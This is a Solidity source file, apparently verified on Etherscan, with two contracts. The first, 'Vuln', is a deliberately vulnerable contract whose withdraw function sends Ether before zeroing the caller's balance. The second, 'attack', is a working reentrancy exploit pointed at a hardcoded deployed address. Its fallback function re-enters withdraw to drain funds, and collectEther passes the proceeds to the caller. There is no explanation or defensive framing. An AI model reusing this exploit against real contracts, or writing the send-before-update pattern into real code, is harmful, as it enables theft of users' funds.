/**
 *Submitted for verification at Etherscan.io on 2022-12-02
*/

pragma solidity ^0.6.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }

}

contract attack {

    Vuln vuln;

    constructor() public{
        vuln = Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d));
    }

    function addFunds() public payable{

        require(msg.value >= 0.1 ether,"Deposits must be no less than 0.1 Ether");

        vuln.deposit.value(msg.value)();
        vuln.withdraw();
    }

    function collectEther() public {
      msg.sender.transfer(address(this).balance);
    }

    fallback () payable external {
      if (address(this).balance < 0.2 ether) {
          vuln.withdraw();
      }
  }

}